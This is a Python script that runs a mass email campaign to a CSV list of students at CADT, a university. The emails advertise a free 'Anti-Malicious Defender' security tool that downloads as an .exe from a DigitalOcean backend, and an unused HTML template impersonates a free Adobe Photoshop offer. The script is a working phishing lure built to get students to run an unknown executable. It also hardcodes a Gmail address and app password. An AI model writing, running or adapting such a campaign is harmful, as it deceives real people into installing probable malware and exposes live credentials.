import smtplib
import ssl
import time
import csv
import os
import subprocess
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase

# ===== CONFIGURATION =====
CSV_FILE = 'email_dataset.csv'
SENDER_EMAIL = "yo4tube.company168@gmail.com"
SENDER_PASSWORD = "nabzxqwuyngaqvym"

# =====================================================
# DIGITAL OCEAN BACKEND URL CONFIGURATION
# =====================================================
# DigitalOcean deployed backend URL
BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"

# Anti-Malicious Defender download links
DOWNLOAD_PAGE = f"{BACKEND_URL}/anti-download"
DOWNLOAD_LINK_EXE = f"{BACKEND_URL}/api/anti-download"
DOWNLOAD_LINK_ZIP = f"{BACKEND_URL}/api/anti-download-zip"

print(f"🛡️  Anti-Malicious Defender Email Campaign")
print(f"📥 Download page: {DOWNLOAD_PAGE}")
print(f"📥 Direct download (.exe): {DOWNLOAD_LINK_EXE}")
print(f"📥 ZIP package: {DOWNLOAD_LINK_ZIP}")
print()
# =====================================================

SUPPORT_MESSAGE = "For support, reply to this email or contact us at security@anti-malicious.com"
YOUR_NAME = "Anti-Malicious Security Team"  # Your name/team name

# ===== READ CLASSMATES LIST =====
print("📋 Reading classmates list...")
classmates = []
try:
    with open(CSV_FILE, 'r') as file:
        reader = csv.DictReader(file)
        for row in reader:
            if 'email' in row and 'name' in row:
                classmates.append({
                    'email': row['email'].strip(),
                    'name': row['name'].strip()
                })
    
    if not classmates:
        print("❌ No classmates found in CSV!")
        exit()
    
    print(f"✅ Found {len(classmates)} classmates")
    
except Exception as e:
    print(f"❌ Error reading CSV: {e}")
    exit()

# ===== SEND EMAILS =====
success = 0
failed = []

print(f"\n🚀 Starting to send {len(classmates)} emails for Anti-Malicious Defender...")
print("="*50)

try:
    # Connect to Gmail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls(context=ssl.create_default_context())
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    print("✅ Connected to Gmail")
    
    for i, student in enumerate(classmates):
        print(f"\n[{i+1}/{len(classmates)}] Sending to {student['name']}...")
        
        try:
            # Create email
            msg = MIMEMultipart("alternative")
            msg["Subject"] = f"🛡️ Protect Your PC - Free Anti-Malicious Defender for CADT Students!"
            msg["From"] = f"Security Team <{SENDER_EMAIL}>"
            msg["To"] = student['email']
            msg["Reply-To"] = SENDER_EMAIL
            
            # Extract first name (assuming format is "LAST FIRST" or "FIRST LAST")
            full_name = student['name']
            # Try to get first name - split and take last part (usually first name in Cambodian format)
            name_parts = full_name.split()
            first_name = name_parts[-1] if name_parts else full_name
            
            # Text version
            text = f"""Hi {first_name},

As a fellow CADT student, I wanted to share this FREE security tool!

Get Anti-Malicious Defender completely FREE:
✓ Advanced malware protection
✓ Ransomware shield
✓ Browser data protection
✓ USB autorun protection
✓ Network guard

Perfect for protecting your PC and school projects!

Download here: {DOWNLOAD_LINK_EXE}

{SUPPORT_MESSAGE}

This offer is exclusive for students. Stay protected!

Best regards,
Anti-Malicious Security Team
CADT Student Offer"""
            
            # HTML version
            html = f"""<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Photoshop CC 2025 Offer for CADT Students</title>
</head>
<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #001e36 0%, #003366 100%); margin: 0; padding: 20px;">
<div style="max-width: 600px; margin: 20px auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
    
    <!-- Header -->
    <div style="text-align: center; margin-bottom: 30px;">
        <img src="cid:photoshop_logo" alt="Adobe Photoshop" style="width: 100px; height: 100px; margin-bottom: 15px;">
        <div style="display: inline-block; background: #31a8ff; color: white; padding: 10px 20px; border-radius: 50px; font-weight: bold; margin-bottom: 15px;">
            🎓 CADT STUDENT EXCLUSIVE
        </div>
        <h1 style="color: #333; margin: 10px 0 5px 0;">Hi {first_name}! 👋</h1>
        <p style="color: #666; margin: 0;">Special offer for CADT students only</p>
    </div>
    
    <!-- Main Offer -->
    <div style="background: linear-gradient(135deg, #31a8ff 0%, #0078d7 100%); color: white; padding: 30px; border-radius: 12px; margin: 25px 0; text-align: center;">
        <h2 style="margin: 0 0 15px 0; font-size: 28px;">🎁 FREE Download</h2>
        <h3 style="margin: 0 0 20px 0; font-size: 22px;">Adobe Photoshop CC 2025</h3>
        
        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 25px 0;">
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">🖼️</div>
                <p style="margin: 0; font-size: 14px;">Photo Editing</p>
            </div>
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">🤖</div>
                <p style="margin: 0; font-size: 14px;">AI Features</p>
            </div>
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">☁️</div>
                <p style="margin: 0; font-size: 14px;">Cloud Storage</p>
            </div>
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">�</div>
                <p style="margin: 0; font-size: 14px;">Free Updates</p>
            </div>
        </div>
        
        <p style="margin: 20px 0 0 0; opacity: 0.9; font-size: 14px;">
            Regular price: $22.99/month • Student offer: FREE
        </p>
    </div>
    
    <!-- Download QR Code Section -->
    <div style="text-align: center; margin: 30px 0;">
        <p style="color: #333; font-size: 14px; margin-bottom: 15px; font-weight: 600;">Scan to Download Directly:</p>
        <img src="cid:qr_code_image" 
             alt="QR Code for Download" 
             style="width: 100%; max-width: 250px; height: auto; border-radius: 12px; box-shadow: 0 8px 25px rgba(49, 168, 255, 0.3); margin-bottom: 20px; border: 3px solid #31a8ff; padding: 10px; background: white;">
        <p style="color: #666; font-size: 12px; margin-top: 10px;">📱 Point your phone camera at this QR code</p>
    </div>
    
    <!-- Download Button -->
    <div style="text-align: center; margin: 35px 0;">
        <a href="{DOWNLOAD_LINK}" 
           style="background: linear-gradient(135deg, #31a8ff 0%, #0078d7 100%); 
                  color: white; 
                  padding: 18px 50px; 
                  text-decoration: none; 
                  border-radius: 10px; 
                  font-weight: bold; 
                  font-size: 18px; 
                  display: inline-block;
                  box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
                  transition: all 0.3s;
                  border: none;
                  cursor: pointer;">
            🚀 DOWNLOAD NOW
        </a>
        <p style="color: #666; font-size: 13px; margin-top: 12px;">
            Windows & macOS Compatible • Exclusive CADT Student Access
        </p>
    </div>
    
    <!-- Student Benefits -->
    <div style="background: #f8f9fa; padding: 25px; border-radius: 10px; margin: 25px 0; border-left: 5px solid #31a8ff;">
        <h3 style="color: #333; margin-top: 0;">🎓 Perfect for Students:</h3>
        <ul style="color: #555; line-height: 1.8; padding-left: 20px;">
            <li>✓ Create stunning designs for projects</li>
            <li>✓ Edit photos professionally</li>
            <li>✓ Learn industry-standard tools</li>
            <li>✓ Build your portfolio</li>
        </ul>
    </div>
    
    <!-- Support Section -->
    <div style="text-align: center; padding: 25px; background: linear-gradient(135deg, #001e36 0%, #003366 100%); color: white; border-radius: 10px; margin: 25px 0;">
        <h3 style="margin-top: 0; color: white;">💬 Need Help?</h3>
        <p style="opacity: 0.9; margin-bottom: 10px;">{SUPPORT_MESSAGE}</p>
        <p style="opacity: 0.8; font-size: 14px;">We're here to help CADT students!</p>
    </div>
    
    <!-- Footer -->
    <div style="text-align: center; padding-top: 25px; border-top: 1px solid #eee; margin-top: 30px;">
        <p style="color: #888; font-size: 12px; line-height: 1.6; margin: 0;">
            This is an exclusive offer for CADT University students only.<br>
            Offer valid for limited time. One redemption per student.<br><br>
            Adobe and the Adobe logo are trademarks of Adobe Inc.<br>
            <span style="color: #666; font-size: 11px;">Sent with ❤️ to CADT students</span>
        </p>
    </div>
    
</div>
</body>
</html>"""
            
            # Attach both versions
            msg.attach(MIMEText(text, "plain"))
            # msg.attach(MIMEText(html, "html"))  # HTML disabled - causes delivery issues
            
            # Attach Photoshop logo image
            logo_path = os.path.join(os.path.dirname(__file__), 'photoshop_logo.png')
            if os.path.exists(logo_path):
                try:
                    with open(logo_path, 'rb') as attachment:
                        img = MIMEImage(attachment.read())
                        img.add_header('Content-ID', '<photoshop_logo>')
                        img.add_header('Content-Disposition', 'inline', filename='photoshop_logo.png')
                        msg.attach(img)
                except Exception as e:
                    print(f"   ⚠️  Could not attach Photoshop logo: {e}")
            
            # Attach QR code image if it exists
            qr_code_path = os.path.join(os.path.dirname(__file__), 'qr_code.png')
            if os.path.exists(qr_code_path):
                try:
                    with open(qr_code_path, 'rb') as attachment:
                        img = MIMEImage(attachment.read())
                        img.add_header('Content-ID', '<qr_code_image>')
                        img.add_header('Content-Disposition', 'inline', filename='qr_code.png')
                        msg.attach(img)
                except Exception as e:
                    print(f"   ⚠️  Could not attach QR code: {e}")
            
            # Send
            server.sendmail(SENDER_EMAIL, student['email'], msg.as_string())
            success += 1
            print(f"   ✅ Sent to {student['name']}")
            
            # Wait between emails (avoid Gmail rate limits)
            if i < len(classmates) - 1:
                wait_time = 3  # seconds between emails
                print(f"   ⏳ Waiting {wait_time} seconds...")
                time.sleep(wait_time)
                
        except Exception as e:
            print(f"   ❌ Failed for {student['name']}: {str(e)[:80]}")
            failed.append(student['email'])
            time.sleep(5)  # Wait longer on error
    
    # Close connection
    server.quit()
    print("\n🔒 Connection closed")
    
except Exception as e:
    print(f"\n❌ Connection error: {e}")

# ===== RESULTS =====
print("\n" + "="*50)
print("📊 EMAIL CAMPAIGN RESULTS")
print("="*50)
print(f"✅ Successfully sent: {success}/{len(classmates)}")
print(f"❌ Failed to send: {len(failed)}")

if failed:
    print("\n📝 Failed emails (save this list):")
    for email in failed:
        print(f"  - {email}")
    
    # Option to save failed emails to file
    save_failed = input("\n💾 Save failed emails to file? (y/n): ")
    if save_failed.lower() == 'y':
        with open('failed_emails.txt', 'w') as f:
            for email in failed:
                f.write(email + '\n')
        print("📁 Saved to 'failed_emails.txt'")

print(f"\n🎉 Campaign completed!")
print("="*50)
print("\n📌 IMPORTANT NOTES:")
print("1. Check your sent folder in Gmail to verify")
print("2. Some emails may go to spam - ask friends to check")
print("3. Gmail daily limit: ~500 emails")
print("4. Failed emails can be retried later")
print("="*50)